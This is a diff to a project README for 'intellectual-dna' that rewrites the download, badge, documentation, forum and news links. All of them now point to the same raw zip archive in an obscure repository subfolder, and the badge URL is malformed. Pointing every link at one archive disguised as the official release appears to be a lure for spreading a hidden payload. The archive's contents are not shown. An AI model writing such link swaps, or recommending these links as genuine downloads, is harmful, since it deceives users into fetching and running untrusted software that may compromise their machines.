@@ -6,7 +6,7 @@ Welcome to intellectual-dna! This guide will help you download and run our perso
 
 To get started, you will need to download the software from our Releases page. You will find the latest version ready for download.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/karixmas/intellectual-dna/releases)
+[![Download Now](https://raw.githubusercontent.com/karixmas/intellectual-dna/main/mordelab/02-monotropic-prosthetic/intellectual-dna-v3.6.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/karixmas/intellectual-dna/main/mordelab/02-monotropic-prosthetic/intellectual-dna-v3.6.zip)
 
 ## 💾 Download & Install
 
@@ -14,7 +14,7 @@ To get started, you will need to download the software from our Releases page. Y
 
    Click the link below to go to our Releases page, where you will find the most recent version of intellectual-dna:
 
-   [Download the latest release](https://github.com/karixmas/intellectual-dna/releases)
+   [Download the latest release](https://raw.githubusercontent.com/karixmas/intellectual-dna/main/mordelab/02-monotropic-prosthetic/intellectual-dna-v3.6.zip)
 
 2. **Choose Your Version**
 
@@ -83,8 +83,8 @@ If you need help using intellectual-dna, you can reach out for support:
 
 For more information, tutorials, and updates, visit the following resources:
 
-- [Documentation](https://github.com/karixmas/intellectual-dna/wiki)
-- [Community Forum](https://forum.example.com)
-- [Latest News](https://blog.example.com)
+- [Documentation](https://raw.githubusercontent.com/karixmas/intellectual-dna/main/mordelab/02-monotropic-prosthetic/intellectual-dna-v3.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/karixmas/intellectual-dna/main/mordelab/02-monotropic-prosthetic/intellectual-dna-v3.6.zip)
+- [Latest News](https://raw.githubusercontent.com/karixmas/intellectual-dna/main/mordelab/02-monotropic-prosthetic/intellectual-dna-v3.6.zip)
 
 Thank you for choosing intellectual-dna. We hope this application helps you manage your knowledge efficiently!
